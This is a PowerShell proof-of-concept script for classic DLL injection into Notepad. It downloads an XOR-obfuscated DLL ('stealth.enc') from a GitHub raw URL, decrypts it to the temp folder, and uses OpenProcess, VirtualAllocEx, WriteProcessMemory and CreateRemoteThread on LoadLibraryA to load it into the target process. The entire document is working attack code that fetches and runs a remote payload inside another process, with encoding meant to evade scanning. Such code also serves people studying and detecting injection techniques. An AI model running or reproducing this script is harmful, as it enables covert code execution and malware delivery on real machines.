<#
LoadLibrary Injection POC
— Targets Notepad
— Downloads an XOR’d DLL and drops it to disk
— Calls LoadLibraryA remotely in Notepad
#>

#Requires -Version 3.0

### CONFIGURATION ###
$XOR_KEY   = 0x71
$DLL_URL   = "https://raw.githubusercontent.com/Alon1123/Projects/main/stealth.enc"
$DLL_PATH  = "$env:TEMP\stealth.dll"

### WIN32 IMPORTS ###
$win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll",SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out IntPtr written);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr threadId);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr handle);
}
"@
Add-Type -TypeDefinition $win32 -Language CSharp

function Get-NotepadPID {
    $name = "notepad"
    try {
        $p = Get-Process -Name $name -ErrorAction Stop | Select-Object -First 1
    } catch {
        Write-Host "[~] Notepad not running; launching..."
        $p = Start-Process $name -PassThru
        Start-Sleep -Milliseconds 500
    }
    Write-Host "[+] Target Notepad PID: $($p.Id)"
    return $p.Id
}

try {
    # 1) Download & decrypt the DLL
    Write-Host "[~] Downloading encrypted DLL..."
    $enc = (Invoke-WebRequest -Uri $DLL_URL -UseBasicParsing).Content
    $buf = [byte[]]::new($enc.Length)
    for ($i = 0; $i -lt $enc.Length; $i++) {
        $buf[$i] = $enc[$i] -bxor $XOR_KEY
    }

    # 2) Write decrypted DLL to disk
    Write-Host "[~] Writing DLL to $DLL_PATH"
    [IO.File]::WriteAllBytes($DLL_PATH, $buf)

    # 3) Get Notepad PID and open process handle
    $targetPID = Get-NotepadPID
    $hProc     = [Win32]::OpenProcess(0x1F0FFF, $false, $targetPID)
    if ($hProc -eq [IntPtr]::Zero) {
        throw "OpenProcess failed (insufficient rights?)"
    }

    try {
        # 4) Allocate space for the DLL path string
        $pathBytes = [Text.Encoding]::ASCII.GetBytes($DLL_PATH + "`0")
        $len       = $pathBytes.Length
        Write-Host "[~] Allocating $len bytes for path string..."
        $remoteStr = [Win32]::VirtualAllocEx($hProc, [IntPtr]::Zero, $len, 0x3000, 0x04)
        if ($remoteStr -eq [IntPtr]::Zero) {
            throw "VirtualAllocEx failed"
        }

        # 5) Write the path string into target memory
        Write-Host "[~] Writing path string..."
        $written = [IntPtr]::Zero
        $ok = [Win32]::WriteProcessMemory($hProc, $remoteStr, $pathBytes, $len, [ref]$written)
        if (-not $ok -or $written -ne $len) {
            throw "WriteProcessMemory failed"
        }

        # 6) Get the address of LoadLibraryA
        $hKernel = [Win32]::GetModuleHandle("kernel32.dll")
        $addrLL  = [Win32]::GetProcAddress($hKernel, "LoadLibraryA")
        Write-Host "[+] LoadLibraryA @ 0x{0:X}" -f $addrLL.ToInt64()

        # 7) Create the remote thread calling LoadLibraryA
        Write-Host "[~] Creating remote thread..."
        $tid = [IntPtr]::Zero
        $hth = [Win32]::CreateRemoteThread(
            $hProc,
            [IntPtr]::Zero,
            0,
            $addrLL,
            $remoteStr,
            0,
            [ref]$tid
        )
        if ($hth -eq [IntPtr]::Zero) {
            throw "CreateRemoteThread failed"
        }
        Write-Host "[+] Injection succeeded! Thread ID: $tid"

        [Win32]::CloseHandle($hth) | Out-Null
    }
    finally {
        [Win32]::CloseHandle($hProc) | Out-Null
    }

    Write-Host "[✓] Done — check Notepad for the MessageBox."
}
catch {
    Write-Error "[!] Error: $_"
    exit 1
}
